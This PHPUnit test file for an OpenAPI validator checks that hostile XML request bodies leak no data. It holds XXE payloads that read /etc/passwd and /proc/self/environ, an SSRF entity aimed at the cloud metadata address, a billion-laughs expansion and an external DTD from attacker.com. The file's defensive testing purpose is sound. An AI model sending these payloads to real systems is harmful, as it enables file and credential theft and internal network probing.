<?php

declare(strict_types=1);

namespace Duyler\OpenApi\Test\Security;

use Duyler\OpenApi\Builder\OpenApiValidatorBuilder;
use Nyholm\Psr7\Factory\Psr17Factory;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;
use Throwable;

/** @internal */
final class XmlSecurityTest extends TestCase
{
    private Psr17Factory $psrFactory;

    protected function setUp(): void
    {
        $this->psrFactory = new Psr17Factory();
    }

    #[Test]
    public function xxe_attack_via_request_body_does_not_leak_file_content(): void
    {
        $validator = OpenApiValidatorBuilder::create()
            ->fromYamlFile(__DIR__ . '/../fixtures/security-specs/xml-endpoint.yaml')
            ->build();

        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <name>test</name>
    <value>&xxe;</value>
</root>
XML;

        $request = $this->psrFactory->createServerRequest('POST', '/xml-endpoint')
            ->withHeader('Content-Type', 'application/xml')
            ->withBody($this->psrFactory->createStream($xxePayload));

        $exceptionThrown = false;
        $errorMessage = '';

        try {
            $validator->validateRequest($request);
        } catch (Throwable $e) {
            $exceptionThrown = true;
            $errorMessage = $e->getMessage();
        }

        $this->assertStringNotContainsString('/etc/passwd', $errorMessage);
        $this->assertStringNotContainsString('root:', $errorMessage);
        $this->assertStringNotContainsString('/bin/bash', $errorMessage);
    }

    #[Test]
    public function ssrf_via_xxe_blocked(): void
    {
        $validator = OpenApiValidatorBuilder::create()
            ->fromYamlFile(__DIR__ . '/../fixtures/security-specs/xml-endpoint.yaml')
            ->build();

        $ssrfPayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
    <name>test</name>
    <value>&xxe;</value>
</root>
XML;

        $request = $this->psrFactory->createServerRequest('POST', '/xml-endpoint')
            ->withHeader('Content-Type', 'application/xml')
            ->withBody($this->psrFactory->createStream($ssrfPayload));

        $errorMessage = '';

        try {
            $validator->validateRequest($request);
        } catch (Throwable $e) {
            $errorMessage = $e->getMessage();
        }

        $this->assertStringNotContainsString('meta-data', $errorMessage);
        $this->assertStringNotContainsString('169.254.169.254', $errorMessage);
    }

    #[Test]
    public function valid_xml_request_body(): void
    {
        $validator = OpenApiValidatorBuilder::create()
            ->fromYamlFile(__DIR__ . '/../fixtures/security-specs/xml-endpoint.yaml')
            ->build();

        $validXml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>John Doe</name>
    <value>Test Value</value>
</root>
XML;

        $request = $this->psrFactory->createServerRequest('POST', '/xml-endpoint')
            ->withHeader('Content-Type', 'application/xml')
            ->withBody($this->psrFactory->createStream($validXml));

        $operation = $validator->validateRequest($request);

        $this->assertSame('POST', $operation->method);
        $this->assertSame('/xml-endpoint', $operation->path);
    }

    #[Test]
    public function billion_laughs_no_memory_exhaustion(): void
    {
        $validator = OpenApiValidatorBuilder::create()
            ->fromYamlFile(__DIR__ . '/../fixtures/security-specs/xml-endpoint.yaml')
            ->build();

        $billionLaughs = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>
    <name>test</name>
    <value>&lol3;</value>
</root>
XML;

        $request = $this->psrFactory->createServerRequest('POST', '/xml-endpoint')
            ->withHeader('Content-Type', 'application/xml')
            ->withBody($this->psrFactory->createStream($billionLaughs));

        $memoryBefore = memory_get_usage();

        try {
            $validator->validateRequest($request);
        } catch (Throwable) {
        }

        $memoryAfter = memory_get_usage();
        $memoryIncrease = $memoryAfter - $memoryBefore;

        $this->assertLessThan(10 * 1024 * 1024, $memoryIncrease, 'Memory should not increase significantly during billion laughs attack');
    }

    #[Test]
    public function external_dtd_blocked(): void
    {
        $validator = OpenApiValidatorBuilder::create()
            ->fromYamlFile(__DIR__ . '/../fixtures/security-specs/xml-endpoint.yaml')
            ->build();

        $externalDtdPayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<root>
    <name>test</name>
    <value>data</value>
</root>
XML;

        $request = $this->psrFactory->createServerRequest('POST', '/xml-endpoint')
            ->withHeader('Content-Type', 'application/xml')
            ->withBody($this->psrFactory->createStream($externalDtdPayload));

        $errorMessage = '';

        try {
            $validator->validateRequest($request);
        } catch (Throwable $e) {
            $errorMessage = $e->getMessage();
        }

        $this->assertStringNotContainsString('attacker.com', $errorMessage);
    }

    #[Test]
    public function xxe_cdata_no_data_leak(): void
    {
        $validator = OpenApiValidatorBuilder::create()
            ->fromYamlFile(__DIR__ . '/../fixtures/security-specs/xml-endpoint.yaml')
            ->build();

        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<root>
    <name>test</name>
    <value>&xxe;</value>
</root>
XML;

        $request = $this->psrFactory->createServerRequest('POST', '/xml-endpoint')
            ->withHeader('Content-Type', 'application/xml')
            ->withBody($this->psrFactory->createStream($xxePayload));

        $errorMessage = '';

        try {
            $validator->validateRequest($request);
        } catch (Throwable $e) {
            $errorMessage = $e->getMessage();
        }

        $this->assertStringNotContainsString('PATH=', $errorMessage);
        $this->assertStringNotContainsString('HOME=', $errorMessage);
    }
}
